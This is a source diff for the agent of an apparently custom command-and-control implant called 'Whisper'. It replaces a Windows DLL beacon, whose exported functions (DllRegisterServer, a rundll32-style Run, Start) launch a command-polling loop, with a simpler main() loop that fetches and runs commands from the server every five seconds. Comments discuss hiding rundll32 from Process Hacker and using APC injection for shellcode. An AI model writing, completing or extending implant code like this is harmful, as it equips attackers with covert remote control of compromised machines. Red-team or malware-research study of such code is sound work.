@@ -1,109 +1,46 @@
-#include "comms_http.h"
-#include "type_conversions.h"
-#include "whisper_commands.h"
-#include "whisper_config.h"
-#include "whisper_json.h"
-#include "whisper_winapi.h"
-#include "whisper_dynamic_config.h"
-#include <windows.h>
+// core, simple with basic control flow.
 #include <stdio.h>
+#include <unistd.h>
 #include <stdint.h>
 #include <time.h>
-// Function prototype
-DWORD WINAPI BeaconLoop();
-DWORD WINAPI execute_async(char * agent_id);
-void generate_uuid4(char *);
-// Standard Exported Functions
+#include "whisper_config.h"
+#include "whisper_commands.h"
+#include "whisper_json.h"
+#include "comms_http.h"
 
-//note: The thread allows for the functions to detach/return okay, makes it more normal + cleaner
-//this also seems to hide rundll32 from showing up in processhacker. cewl
+int execute(char * agent_id);
+void generate_uuid4(char* agent_id);
 
-//other ideas: Queue APC call to start if doing shellcode
-
-//COM
-__declspec(dllexport) HRESULT DllRegisterServer() {
-    MessageBox(NULL, "Executed via DllRegisterServer!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
-    return S_OK;
-}
-//COM
-__declspec(dllexport) HRESULT DllUnregisterServer() {
-    MessageBox(NULL, "Executed via DllUnregisterServer!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
-    return S_OK;
-}
-
-
- 
-// Other options
-__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    MessageBox(NULL, "Executed via Run!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
-}
-// Other options
-__declspec(dllexport) void Start() {
-    MessageBox(NULL, "Executed via Start!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
-}
-
-
-// Global flag for thread control
-//volatile BOOL keepRunning = TRUE;
-
-// Entry point for the DLL
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
-    switch (fdwReason) {
-    case DLL_PROCESS_ATTACH:
-        DEBUG_LOG("[DLL] Loaded into process\n");
-        break;
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-        break;
-    case DLL_PROCESS_DETACH:
-        DEBUG_LOG("[DLL] Unloaded from process\n");
-        //keepRunning = FALSE;
-        break;
-    }
-    return TRUE;
-}
-
-
-// Main beacon loop (runs in a separate thread)
-DWORD WINAPI BeaconLoop() 
-{
+int main() {
     DEBUG_LOG("STARTING");
 
     char agent_id[37];
     generate_uuid4(agent_id);
 
+    //initialize_critical_sections();
+
+    // Example of setting the execution mode (you can do this at any point in your code)
+    //set_execution_mode(EXEC_MODE_SYNC);  // Initially run synchronously
 
     while (1) {
+        //execution_setup(agent_id); // Call the command execution function
+        execute(agent_id);
 
-        // Create thread
-        HANDLE thread = WhisperCreateThread(NULL, 0, execute_async, agent_id, 0, NULL);
-        if (thread) {
-            CloseHandle(thread); // Let the thread clean itself up
-        } else {
-            DEBUG_LOG("Failed to create thread.\n");
+        //WhisperSleep(get_sleep_time());
+        //Sleep is in MS, so we take the input of sleep time * 1000 to get seconds
+        //WhisperSleep(1000 * get_sleep_time());
+        sleep(5);
 
-        }
-        // Sleep for X seconds before running the next loop, gets time from get_sleep_time()
-        WhisperSleep(get_sleep_time());
     }
+
+    return 0;
 }
 
-// Thread function for executing commands asynchronously
-DWORD WINAPI execute_async(char * agent_id)
-{
 
+// Thread function for executing the command 
+int execute(char * agent_id)
+{
+    
     //this fills in the command, arg and command_id
     InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
     //this populates the new structure with the agent_uuid
@@ -148,11 +85,15 @@ DWORD WINAPI execute_async(char * agent_id)
 
     //Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
     free(OutboundJsonData->agent_id); //freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
+    free(OutboundJsonData->command_result_data); //freeing due to set_response_data function in whipser_commands.h
     free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
 
 
     return 0;
 }
+
+
+
 
 void generate_uuid4(char* uuid) {
     uint8_t bytes[16];
@@ -171,8 +112,8 @@ void generate_uuid4(char* uuid) {
     // Set the variant to 10xxxxxx
     bytes[8] = (bytes[8] & 0x3F) | 0x80;
 
-    // Format UUID as a string
-    sprintf(uuid,
+    // Format UUID as a string (37 characters: 36 + null terminator)
+    snprintf(uuid, 37,
         "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
         bytes[0], bytes[1], bytes[2], bytes[3],
         bytes[4], bytes[5],
